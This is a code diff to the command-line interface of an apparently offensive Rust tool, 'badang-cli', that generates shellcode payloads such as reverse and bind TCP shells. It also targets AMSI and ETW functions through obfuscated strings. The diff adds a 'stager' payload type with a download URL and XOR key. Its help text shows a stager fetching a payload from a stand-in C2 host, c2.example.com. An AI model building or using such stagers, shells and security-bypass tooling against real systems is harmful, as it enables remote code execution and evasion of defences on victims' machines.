@@ -23,6 +23,8 @@ pub struct CLI {
     pub generate_text: String,
     pub generate_lhost: String,
     pub generate_lport: u16,
+    pub generate_url: String,
+    pub generate_stager_key: String,
     pub scan_filter: String,
     pub etw_target: String,
     pub amsi_target: String,
@@ -60,6 +62,8 @@ impl CLI {
             generate_text: String::from("Hello from Badang"),
             generate_lhost: String::from("127.0.0.1"),
             generate_lport: 4444,
+            generate_url: String::new(),
+            generate_stager_key: String::new(),
             scan_filter: String::new(),
             etw_target: crate::obf::s(crate::obf::ETW_EVENT_WRITE),
             amsi_target: crate::obf::s(crate::obf::AMSI_SCAN_BUFFER),
@@ -254,6 +258,18 @@ impl CLI {
                         });
                     }
                 }
+                "--url" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.generate_url = args[i].clone();
+                    }
+                }
+                "--stager-key" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.generate_stager_key = args[i].clone();
+                    }
+                }
                 _ => {
                     eprintln!("Unknown argument: {}", args[i]);
                     print_help();
@@ -331,12 +347,14 @@ fn print_help() {
     println!("  -v, --verbose         Verbose output");
     println!();
     println!("GENERATE OPTIONS:");
-    println!("  --type <TYPE>         Payload type: nop, exec, messagebox, reverse_tcp, bind_tcp");
+    println!("  --type <TYPE>         Payload type: nop, exec, messagebox, reverse_tcp, bind_tcp, stager");
     println!("  --command <CMD>       Command to execute (exec type, default: calc.exe)");
     println!("  --title <TEXT>        MessageBox title (messagebox type)");
     println!("  --text <TEXT>         MessageBox body text (messagebox type)");
     println!("  --lhost <IP>          Listener IP address (reverse_tcp type)");
     println!("  --lport <PORT>        Listener port (reverse_tcp/bind_tcp, default: 4444)");
+    println!("  --url <URL>           Download URL (stager type)");
+    println!("  --stager-key <KEY>    XOR key for payload decryption (stager type)");
     println!();
     println!("GENERATE EXAMPLES:");
     println!("  badang-cli generate --type exec --command \"calc.exe\" -o payload.bin");
@@ -347,6 +365,7 @@ fn print_help() {
         "  badang-cli generate --type reverse_tcp --lhost 192.168.1.10 --lport 4444 -o rev.bin"
     );
     println!("  badang-cli generate --type bind_tcp --lport 4444 -o bind.bin");
+    println!("  badang-cli generate --type stager --url https://c2.example.com/p.bin --stager-key s3cret -o stager.bin");
     println!();
     println!("CONVERT EXAMPLES:");
     println!("  badang-cli convert -i \"fc 48 83 e4 f0\" -o payload.bin");
